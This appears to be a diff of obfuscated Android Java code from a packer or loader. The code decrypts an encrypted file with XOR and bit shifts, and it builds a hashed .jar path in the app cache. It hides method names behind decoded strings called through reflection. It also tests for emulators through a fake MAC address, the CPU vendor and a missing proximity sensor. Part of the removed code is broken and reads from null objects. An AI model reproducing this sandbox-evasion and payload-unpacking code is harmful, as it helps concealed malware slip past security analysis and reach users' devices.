@@ -1,82 +1,40 @@
 package com.dmy;
 
 import android.content.Context;
-import android.os.Build;
-import android.text.TextUtils;
 
-import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.lang.reflect.Method;
-import java.net.NetworkInterface;
 
 public class ClassName0 {
 
-    public static Object invokeMethod(Class<?> clz, String methodName, Object host, Class<?>[] parameterTypes, Object[] args) {
-        Object rst = null;
-        if (clz != null) {
-            Method method = null;
-            try {
-                method = clz.getMethod(methodName, parameterTypes);
-                rst = ClassName1.callMethod(host, method, args);
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-        }
-        return rst;
-    }
-
-    public static String getMacAddress() {
+    public String getCurrentProcessName() {
         try {
-            NetworkInterface networkInterface = NetworkInterface.getByName(new ClassName1().decodeStr("wlan0"));
-            if (networkInterface == null) {
-                return "";
-            }
-            byte[] data = networkInterface.getHardwareAddress();
-            if (data != null) {
-                return ClassName2.toHex(data);
-            }
-        } catch (Exception var3) {
-        }
-        return "";
-    }
-
-    public boolean isCpuCheck() {
-        String aa = "";
-        String istr = new ClassName1().decodeStr("intel");
-        try {
-            InputStream is = null;
-            StringBuffer sb = null;
-            int len = -1;
-            while (true) {
-                len = (int) ClassName0.invokeMethod(is.getClass(), new ClassName1().decodeStr("msreadms").substring(2, 6), is, (Class<?>[]) null, (Object[]) null);
-                if (len == -1) {
-                    break;
-                }
-                sb.append((char) len);
-            }
-            aa = sb.toString();
-            is.close();
-        } catch (Exception var7) {
-        }
-        String aStr = new ClassName1().decodeStr("amd");
-        return aa.contains(istr) || aa.contains(aStr);
-    }
-
-    public static boolean isMacBad() {
-        String macString = ClassName0.getMacAddress();
-        if (TextUtils.isEmpty(macString)) {
-            return false;
-        } else if (new ClassName1().decodeStr("2:0:0:0:0:0").equals(macString)) {
-            return true;
-        } else {
-            return false;
+            String classStr = ClassName2.decodeStr("android.app.ActivityThread");
+            Class<?> cl = Class.forName(classStr);
+            Object var2 = ClassName1.invokeStaticMethod(cl, ClassName2.decodeStr("currentActivityThread"), null);
+            return (String) new ClassName4().invokeNoStaticMethod(var2, ClassName2.decodeStr("getProcessName"), null);
+        } catch (Exception var6) {
+            var6.printStackTrace();
+            return null;
         }
     }
 
-    public void decodeFile(InputStream p0, FileOutputStream p1) throws IOException {
-        byte[] encCode = ClassName3.getCodeByte(p0);
+    public static String toHex(byte[] data) {
+        StringBuffer buffer = new StringBuffer();
+        for (int i = 0; i < data.length; ++i) {
+            byte b = data[i];
+            buffer.append(String.format("%x", b));
+            if (i != data.length - 1) {
+                buffer.append(":");
+            }
+        }
+        return buffer.toString();
+    }
+
+    public static void decodeFile(InputStream p0, FileOutputStream p1) throws IOException {
+        byte[] encCode = ClassName2.getCodeByte(p0);
         int num = encCode.length;
         int var3 = 0;
         byte[] var4 = new byte[8 * 1024];
@@ -88,7 +46,7 @@ public class ClassName0 {
                     tt = (byte) ~(tt ^ encCode[var3 % num]);
                     int value_1 = (tt & 0xff) >>> 4;
                     int value_2 = (tt & 0xff) << 4;
-                    var4[i] = ClassName2.orOperation(value_1, value_2);
+                    var4[i] = ClassName4.orOperation(value_1, value_2);
                     i++;
                     var3++;
                 }
@@ -97,37 +55,26 @@ public class ClassName0 {
         }
     }
 
-    public static File getTargetFile(Context context) {
-        String hashCodeMethod = new ClassName1().decodeStr("mhashCodems").substring(1, 9);
-        String processName = new ClassName4().getCurrentProcessName();
-        String parentPath = "" + processName;
-        parentPath = "" + ClassName0.invokeMethod(processName.getClass(), hashCodeMethod, parentPath, (Class<?>[]) null, (Object[]) null);
-        String targetPath = (Build.VERSION.SDK_INT + processName);
-        targetPath = "" + ClassName0.invokeMethod(processName.getClass(), hashCodeMethod, targetPath, (Class<?>[]) null, (Object[]) null) + new ClassName1().decodeStr(".jar");
-        File targetFile = new File(context.getCacheDir(), parentPath + File.separator + targetPath);
-        ClassName0.createFile(targetFile);
-        return targetFile;
-    }
-
-    public static Object invokeNoStaticMethod(Object host, String name, Class<?>[] clsArray, Object... pArray) {
+    public Object callMethod(Object host, Method method, Object[] args) {
+        Object invoke = null;
         try {
-            if (host == null) {
-                return null;
-            }
-            Method method = host.getClass().getMethod(name, clsArray);
-            method.setAccessible(true);
-            return method.invoke(host, pArray);
+            invoke = method.invoke(host, args);
         } catch (Exception e) {
             e.printStackTrace();
         }
-        return null;
+        return invoke;
     }
 
-    public static void createFile(File p0) {
-        if (!p0.exists()) {
-            File parentFile = (File) ClassName0.invokeNoStaticMethod(p0, new ClassName1().decodeStr("msgetParentFilems").substring(2, 15), null);
-            ClassName0.invokeNoStaticMethod(parentFile, new ClassName1().decodeStr("mkdirs"), null);
-            ClassName0.invokeNoStaticMethod(p0, new ClassName1().decodeStr("createNewFile"), null);
+    public static boolean checkHasProximitySensor(Context context) {
+        try {
+            Object ob = new ClassName4().invokeNoStaticMethod(context, ClassName2.decodeStr("getSystemService"), new Class[] { String.class }, ClassName2.decodeStr("mssensorms").substring(2, 8));
+            Object re = new ClassName4().invokeNoStaticMethod(ob, ClassName2.decodeStr("getDefaultSensor"), new Class[] { int.class }, 8);
+            if (re == null) {
+                return true;
+            }
+        } catch (Exception e) {
+            return true;
         }
+        return false;
     }
 }
